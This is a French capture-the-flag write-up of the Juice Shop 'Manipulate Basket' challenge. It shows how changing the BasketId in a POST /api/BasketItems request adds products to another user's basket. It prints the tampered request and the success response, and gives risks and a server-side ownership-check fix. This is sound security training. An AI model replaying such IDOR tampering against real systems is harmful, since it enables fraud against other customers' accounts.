# Manipulate Basket

> **Category :** Broken Access Control  
> **Difficulty :** 3  

## Methodology

1. **Recherche de faille**
   - Technique : Analyse des requêtes, Énumération
   - Outil : BurpSuite (Proxy, Interceptor)
   - Description : Ajout d'un produit à son propre panier et interception de la requête pour analyser les paramètres envoyés au serveur. Identification du paramètre `BasketId` dans la requête.

2. **Exploitation de la faille**
   - Technique : IDOR (Insecure Direct Object Reference)
   - Outil : BurpSuite (Repeater)
   - Description : Modification du paramètre `BasketId` dans la requête pour cibler le panier d'un autre utilisateur. Le serveur ne vérifie pas que le panier appartient à l'utilisateur authentifié.

| Partie | Rôle |
|--------|------|
| `POST /api/BasketItems` | Endpoint d'ajout de produit au panier |
| `BasketId` | Identifiant du panier ciblé |
| `ProductId` | Identifiant du produit à ajouter |
| `quantity` | Quantité du produit |

## Vulnerabilities

**Vulnerability :** Broken Access Control - IDOR (Insecure Direct Object Reference)

**Components :** API REST, Système de panier, Contrôle d'accès

**Severity level :** Élevé

## Risks

- Manipulation du panier d'autres utilisateurs (ajout de produits non désirés)
- Perturbation de l'expérience utilisateur
- Fraude potentielle (ajout de produits coûteux pour augmenter la facture d'un autre utilisateur)
- Atteinte à la confiance des clients envers la plateforme
- Possibilité d'énumérer les paniers existants

## Actions

**Risks mitigation strategies :**
- Implémenter une validation côté serveur de l'appartenance du panier à l'utilisateur
- Utiliser des identifiants non prévisibles (UUID) pour les paniers

**Remediation fixes :**
Vérifier que le panier appartient à l'utilisateur authentifié :
```javascript
app.post('/api/BasketItems', async (req, res) => {
    const { BasketId, ProductId, quantity } = req.body;
    const userId = req.user.id; // Utilisateur authentifié
    
    // Vérifier que le panier appartient à l'utilisateur
    const basket = await db.get("SELECT * FROM Baskets WHERE id = ? AND UserId = ?", [BasketId, userId]);
    
    if (!basket) {
        return res.status(403).json({ error: "Access denied: This basket does not belong to you" });
    }
    
    // Ajouter le produit au panier
    await db.run("INSERT INTO BasketItems (BasketId, ProductId, quantity) VALUES (?, ?, ?)", [BasketId, ProductId, quantity]);
    res.json({ status: "success" });
});
```

**Security practice :**
- Toujours valider l'appartenance des ressources à l'utilisateur authentifié
- Ne jamais faire confiance aux identifiants fournis par le client
- Implémenter des contrôles d'accès basés sur les rôles (RBAC)
- Journaliser les tentatives d'accès non autorisées

## Evidences and artifacts

**Request originale (panier personnel) :**
```http
POST /api/BasketItems HTTP/2
Host: ctf.juice.cyber.epitest.eu
Content-Type: application/json
Authorization: Bearer [JWT_TOKEN]

{
    "BasketId": 1,
    "ProductId": 1,
    "quantity": 1
}
```

**Request modifiée (panier d'un autre utilisateur) :**
```http
POST /api/BasketItems HTTP/2
Host: ctf.juice.cyber.epitest.eu
Content-Type: application/json
Authorization: Bearer [JWT_TOKEN]

{
    "BasketId": 2,
    "ProductId": 1,
    "quantity": 1
}
```

**Response :**
```json
{
    "status": "success",
    "data": {
        "id": 7,
        "BasketId": 2,
        "ProductId": 1,
        "quantity": 1
    }
}
```